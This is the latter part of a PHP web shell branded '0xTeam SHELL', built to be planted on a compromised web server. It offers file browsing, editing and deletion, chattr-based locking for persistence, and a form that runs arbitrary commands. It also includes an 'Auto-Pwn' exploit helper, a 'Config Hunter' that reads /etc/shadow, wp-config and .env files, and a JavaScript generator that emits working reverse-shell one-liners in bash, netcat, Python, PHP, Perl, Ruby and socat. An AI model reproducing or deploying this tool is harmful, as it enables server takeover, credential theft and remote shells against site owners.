                 echo '<div class="form-section"><h3><i class="fas fa-folder-plus"></i> Create New Folder in ' . htmlspecialchars(PATH) . '</h3><form method="post" action="?p='.urlencode(encodePath(PATH)).'">Folder Name:<input type="text" name="folder_name" placeholder="new_folder" required><input type="submit" class="action-btn" value="Create Folder!" name="create_folder"></form></div>';
             }
             elseif (isset($_GET['r']) && isset($_GET['file'])) { 
                 $item_to_rename = urldecode($_GET['file']); 
                 echo '<div class="form-section"><h3><i class="fas fa-edit"></i> Rename: ' . htmlspecialchars($item_to_rename). '</h3><form method="post" action="?p='.urlencode(encodePath(PATH)).'"><input type="hidden" name="original_name" value="' . htmlspecialchars($item_to_rename) . '">New Name:<input type="text" name="new_name" value="' . htmlspecialchars($item_to_rename) . '" required><input type="submit" class="action-btn" value="Rename!" name="rename"></form></div>'; 
             }
             elseif (isset($_GET['e']) && isset($_GET['file'])) { 
                 $file_to_edit = urldecode($_GET['file']); 
                 $file_path = PATH . "/" . $file_to_edit; 
                 echo '<div class="form-section">'; 
                 if (!is_file($file_path)) { 
                     echo '<div class="message error">Hata: Dosya değil!</div>'; 
                 } elseif (!is_readable($file_path)) { 
                     echo '<div class="message error">Hata: Okunamıyor!</div>'; 
                 } elseif (!is_writable($file_path)) { 
                     echo '<div class="message error">Uyarı: Yazılamıyor!</div>'; 
                     $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); 
                     echo '<h4><i class="fas fa-eye"></i> Viewing: ' . htmlspecialchars($file_to_edit) . '</h4><textarea readonly style="background-color: #101010;">' . $content . '</textarea>'; 
                 } else { 
                     $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); 
                     echo '<form method="post" action="?p='.urlencode(encodePath(PATH)).'"><h3 style="color: var(--header-color);"><i class="fas fa-file-pen"></i> Editing: ' . htmlspecialchars($file_to_edit) . '</h3><textarea name="data">' . $content . '</textarea><br><input type="hidden" name="file_to_save" value="' . htmlspecialchars($file_to_edit) . '"><input type="submit" class="action-btn" value="Save Changes!" name="edit"></form>'; 
                 } 
                 echo '</div>'; 
             }
             $show_file_manager = false;
        }

        // Dosya Yöneticisi
        if ($show_file_manager) {
            if (!is_dir(PATH)) { 
                echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin değil! Path: ' . htmlspecialchars(PATH) . '</div>'; 
            }
            elseif (!($scan = @scandir(PATH))) { 
                echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin okunamadı! (' . htmlspecialchars(PATH) . ')</div>'; 
            }
            else {
                $folders = array(); 
                $files = array(); 
                foreach ($scan as $obj) { 
                    if ($obj == '.' || $obj == '..') continue; 
                    $full_obj_path = PATH . '/' . $obj; 
                    if (@is_dir($full_obj_path)) { 
                        array_push($folders, $obj); 
                    } else { 
                        array_push($files, $obj); 
                    } 
                } 
                usort($folders, 'strcoll'); 
                usort($files, 'strcoll');
                echo '<table class="hacker-table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>';
                
                foreach ($folders as $folder) { 
                    $folder_path = PATH . "/" . $folder; 
                    $perms = @fileperms($folder_path); 
                    $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); 
                    $mtime = @filemtime($folder_path); 
                    $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); 
                    $perms_readable = perms_to_string($perms); 
                    $file_encoded = urlencode($folder); 
                    $path_encoded_url = urlencode(encodePath(PATH)); 
                    echo "<tr><td><i class='fas fa-folder hacker-icon-folder'></i> <a href='?p=" . urlencode(encodePath($folder_path)) . "'>" . htmlspecialchars($folder) . "</a></td><td><b>[DIR]</b></td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-file-pen' style='opacity:0.3;'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-download' style='opacity:0.3;'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0755)' href='?chmod=0755&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; 
                }
                
                foreach ($files as $file) { 
                    $file_path = PATH . "/" . $file; 
                    $perms = @fileperms($file_path); 
                    $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); 
                    $size = @filesize($file_path); 
                    $size_str = ($size === false) ? '???' : formatSizeUnits($size); 
                    $mtime = @filemtime($file_path); 
                    $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); 
                    $perms_readable = perms_to_string($perms); 
                    $file_encoded = urlencode($file); 
                    $path_encoded_url = urlencode(encodePath(PATH)); 
                    echo "<tr><td>" . fileIcon($file) . htmlspecialchars($file) . "</td><td>" . $size_str . "</td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='?e=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-file-pen'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='?dl=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-download'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0644)' href='?chmod=0644&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; 
                }
                echo "</tbody></table>";
            }
        }
        ?>

        <!-- Komut Çalıştırma -->
        <div class="command-section">
             <h3><i class="fas fa-terminal"></i> Execute Command</h3>
             <div class="quick-cmd-buttons">
                 <button class="quick-cmd-btn" onclick="setCmd('whoami')">whoami</button>
                 <button class="quick-cmd-btn" onclick="setCmd('id')">id</button>
                 <button class="quick-cmd-btn" onclick="setCmd('uname -a')">uname -a</button>
                 <button class="quick-cmd-btn" onclick="setCmd('ps aux')">ps aux</button>
                 <button class="quick-cmd-btn" onclick="setCmd('netstat -tulnp')">netstat</button>
             </div>
             <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" class="command-form">
                 <input type="text" id="command_input" name="command" placeholder="Enter command..." value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" required>
                 <button type="submit" name="run_command" class="action-btn">Run!</button>
             </form>
             <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run_command'])): ?>
                 <h4>Output:</h4>
                 <pre class="command-output"><?php echo $action_result_output; ?></pre>
             <?php endif; ?>
        </div>

         <!-- Açılır/Kapanır Bölümler -->
        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn']))) ? 'open' : ''; ?>>
            <summary><i class="fas fa-shield-alt"></i> System Info & Exploit Helper</summary>
            <div>
                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="analyze_system" class="action-btn">Analyze System</button> </form>
                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="attempt_autopwn" class="action-btn" style="background:#f0ad4e;color:#000;" onclick="return confirm('Auto-Pwn?')">Try Auto-Pwn!</button> </form>
                <?php if (($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn'])))): ?>
                     <h4>Analysis / Attempt Result:</h4>
                     <pre class="info-output"><?php echo $action_result_output; ?></pre>
                     <p> <a href="https://www.exploit-db.com/" target="_blank" class="action-btn">Search Exploit-DB</a> <a href="https://gtfobins.github.io/" target="_blank" class="action-btn">Check GTFOBins</a> </p>
                 <?php endif; ?>
            </div>
        </details>

        <details class="collapsible-section"> 
            <summary><i class="fas fa-satellite-dish"></i> Reverse Shell Helper</summary> 
            <div> 
                <form method="post" onsubmit="generateShell(event)"> 
                    Your IP: <input type="text" id="rev_ip" value="<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>" style="width:150px; display:inline-block; margin-right:10px;"> 
                    Port: <input type="text" id="rev_port" value="4444" style="width:80px; display:inline-block; margin-right:10px;"> 
                    Type: <select id="shell_type" style="background:var(--code-bg); color:var(--text-color); border:1px solid var(--border-color); padding: 4px;"> 
                        <option value="bash_tcp">Bash TCP</option> 
                        <option value="nc_e">Netcat -e</option> 
                        <option value="nc_mkfifo">Netcat mkfifo</option> 
                        <option value="python3">Python3</option> 
                        <option value="php">PHP</option> 
                        <option value="perl">Perl</option> 
                        <option value="ruby">Ruby</option> 
                        <option value="socat">Socat</option> 
                    </select> 
                    <button type="submit" class="action-btn">Generate!</button> 
                </form> 
                <pre id="generated_shell_output" class="command-output" style="margin-top:10px; display:none;"></pre> 
            </div> 
        </details>

        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['read_config'])) ? 'open' : ''; ?>>
             <summary><i class="fas fa-key"></i> Config Hunter</summary>
             <div> 
                 <p>Attempt to read common configuration files:</p> 
                 <div class="quick-cmd-buttons"> 
                     <a href="?read_config=passwd&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">/etc/passwd</button></a> 
                     <a href="?read_config=shadow&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn" style="background:#f0ad4e;color:#000;">/etc/shadow</button></a> 
                     <a href="?read_config=wpconfig&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (here)</button></a> 
                     <a href="?read_config=wpconfig_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (up)</button></a> 
                     <a href="?read_config=env&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (here)</button></a> 
                     <a href="?read_config=env_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (up)</button></a> 
                     <a href="?read_config=apache_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">apache2.conf</button></a> 
                     <a href="?read_config=nginx_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">nginx.conf</button></a> 
                     <a href="?read_config=php_ini&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">php.ini</button></a> 
                 </div>
                 <?php if (isset($_GET['read_config'])): ?>
                     <h4>Config File Content:</h4>
                     <pre class="info-output"><?php echo $action_result_output; ?></pre>
                 <?php endif; ?>
             </div>
        </details>

        <div class="hacker-footer">
            <p>0xTeam SHELL <?php echo $SHELL_VERSION; ?> | <a href="https://github.com/0xteam" target="_blank">GitHub</a> | <a href="mailto:admin@0xteam.org">Contact</a></p>
        </div>

    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const typed = new Typed('#shell-title', {
                strings: ['0xNix Bypass Shell', '0xNix Bypass Shell'],
                typeSpeed: 200,
                backSpeed: 150,
                backDelay: 3000,
                startDelay: 1000,
                loop: true,
                showCursor: true,
                cursorChar: '_'
            });
        });

        function setCmd(cmd) {
            document.getElementById('command_input').value = cmd;
        }
        
        function generateShell(event) {
            event.preventDefault();
            
            const ip = document.getElementById('rev_ip').value;
            const port = document.getElementById('rev_port').value;
            const type = document.getElementById('shell_type').value;
            
            let shellCode = '';
            
            switch(type) {
                case 'bash_tcp':
                    shellCode = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    break;
                case 'nc_e':
                    shellCode = `nc -e /bin/sh ${ip} ${port}`;
                    break;
                case 'nc_mkfifo':
                    shellCode = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
                    break;
                case 'python3':
                    shellCode = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                    break;
                case 'php':
                    shellCode = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    break;
                case 'perl':
                    shellCode = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    break;
                case 'ruby':
                    shellCode = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                    break;
                case 'socat':
                    shellCode = `socat TCP:${ip}:${port} EXEC:/bin/sh`;
                    break;
            }
            
            const output = document.getElementById('generated_shell_output');
            output.style.display = 'block';
            output.textContent = shellCode;
            
            navigator.clipboard.writeText(shellCode).then(function() {
                alert('Shell code copied to clipboard!');
            }).catch(function() {
                console.log('Could not copy to clipboard');
            });
        }

        function autoRefresh() {
            if (confirm('Enable auto-refresh every 30 seconds?')) {
                setInterval(function() {
                    window.location.reload();
                }, 30000);
            }
        }

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                window.location.href = '?upload=1&p=<?php echo urlencode(encodePath(PATH)); ?>';
            }
            
            if (e.ctrlKey && e.key === 'n') {
                e.preventDefault();
                window.location.href = '?create_file=1&p=<?php echo urlencode(encodePath(PATH)); ?>';
            }
            
            if (e.ctrlKey && e.key === 'm') {
                e.preventDefault();
                window.location.href = '?create_folder=1&p=<?php echo urlencode(encodePath(PATH)); ?>';
            }
            
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                window.location.href = '?p=<?php echo encodePath('/'); ?>';
            }
            
            if (e.ctrlKey && e.key === 'h') {
                e.preventDefault();
                window.location.href = '?p=<?php echo urlencode(encodePath($doc_root)); ?>';
            }
        });

        document.addEventListener('DOMContentLoaded', function() {
            const fileLinks = document.querySelectorAll('.hacker-table td a[href*="?p="]');
            
            fileLinks.forEach(function(link) {
                link.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    
                    const menu = document.createElement('div');
                    menu.style.cssText = `
                        position: fixed;
                        top: ${e.pageY}px;
                        left: ${e.pageX}px;
                        background: var(--terminal-bg);
                        border: 1px solid var(--border-color);
                        border-radius: 5px;
                        padding: 5px 0;
                        z-index: 1000;
                        min-width: 120px;
                    `;
                    
                    const options = ['Edit', 'Rename', 'Delete', 'Download'];
                    options.forEach(function(option) {
                        const item = document.createElement('div');
                        item.textContent = option;
                        item.style.cssText = `
                            padding: 5px 10px;
                            cursor: pointer;
                            color: var(--text-color);
                            font-size: 0.9em;
                        `;
                        
                        item.addEventListener('mouseenter', function() {
                            this.style.backgroundColor = 'var(--button-bg)';
                        });
                        
                        item.addEventListener('mouseleave', function() {
                            this.style.backgroundColor = 'transparent';
                        });
                        
                        menu.appendChild(item);
                    });
                    
                    document.body.appendChild(menu);
                    
                    setTimeout(function() {
                        document.addEventListener('click', function() {
                            if (menu.parentNode) {
                                menu.parentNode.removeChild(menu);
                            }
                        }, { once: true });
                    }, 100);
                });
            });
        });

        function showProgress() {
            const progressBar = document.createElement('div');
            progressBar.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 3px;
                background: var(--header-color);
                z-index: 9999;
                animation: progress 2s ease-in-out;
            `;
            
            document.body.appendChild(progressBar);
            
            setTimeout(function() {
                if (progressBar.parentNode) {
                    progressBar.parentNode.removeChild(progressBar);
                }
            }, 2000);
        }

        const forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            form.addEventListener('submit', function() {
                showProgress();
            });
        });

        const style = document.createElement('style');
        style.textContent = `
            @keyframes progress {
                0% { width: 0%; }
                50% { width: 70%; }
                100% { width: 100%; }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>